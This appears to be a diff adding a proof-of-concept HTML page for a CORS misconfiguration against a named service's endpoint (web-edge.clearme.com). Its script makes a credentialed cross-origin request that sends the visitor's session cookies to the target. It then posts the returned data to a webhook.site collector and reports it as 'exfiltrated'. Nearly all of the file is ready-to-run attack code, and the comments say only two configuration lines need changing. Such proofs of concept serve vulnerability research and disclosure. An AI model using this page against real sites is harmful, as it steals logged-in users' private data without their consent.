@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+  <html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <title>CORS Exfiltration PoC – Clearme</title>
+  <style>
+    body {font-family:Arial,Helvetica,sans-serif; margin:2rem;}
+    pre {background:#f4f4f4; padding:1rem; border:1px solid #ddd;
+  max-height:300px; overflow:auto;}
+  </style>
+  </head>
+  <body>
+
+  <h2>CORS Exfiltration Proof of Concept</h2>
+  <p>If you are logged into Clearme, this page will attempt to read data
+  from
+     <code>https://web-edge.clearme.com/</code> and send it to your
+  webhook collector.</p>
+
+  <pre id="log"></pre>
+
+  <script>
+    // -----------------------------------------------------------------
+    // Configuration – only these two lines need to be changed
+    // -----------------------------------------------------------------
+    const TARGET_URL   = 'https://web-edge.clearme.com/';          // 
+  endpoint to test
+    const COLLECTOR    =
+  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // your 
+  webhook URL
+    // -----------------------------------------------------------------
+
+    // Helper to append text to the <pre> box
+    function log(msg) {
+      const el = document.getElementById('log');
+      el.textContent += msg + '\n';
+      el.scrollTop = el.scrollHeight; // keep latest visible
+    }
+
+    // Perform the cross‑origin request with credentials
+    fetch(TARGET_URL, {
+      method: 'GET',
+      credentials: 'include',   // <-- sends cookies (sessionId, etc.)
+      mode: 'cors'
+    })
+    .then(response => {
+      log(`[+] Request to ${TARGET_URL}`);
+      log(`    Status: ${response.status}`);
+      log(`    Headers: 
+  ${JSON.stringify([...response.headers.entries()])}`);
+      // Try to read the body as text (fallback to empty string on error)
+      return response.text().then(text => ({status: response.status, body:
+  text}));
+    })
+    .then(({status, body}) => {
+      log(`    Response Body (first 500 chars):\n${body.substring(0, 
+  500)}`);
+      // Build the payload to send to the collector
+      const payload = {
+        url: TARGET_URL,
+        status,
+        body   // you could trim this if the body is huge
+      };
+      // Send the data to your webhook collector
+      return fetch(COLLECTOR, {
+        method: 'POST',
+        mode: 'no-cors', // we don't need to read the collector's response
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+    })
+    .then(() => {
+      log('[+] Data successfully exfiltrated to webhook.site');
+    })
+    .catch(err => {
+      log(`[-] Error: ${err}`);
+      // Even if something went wrong, we still show that the browser 
+  allowed the request
+      log('Nevertheless, the browser permitted the cross‑origin request 
+  with credentials.');
+    });
+  </script>
+  
+  </body>
+  </html>
+
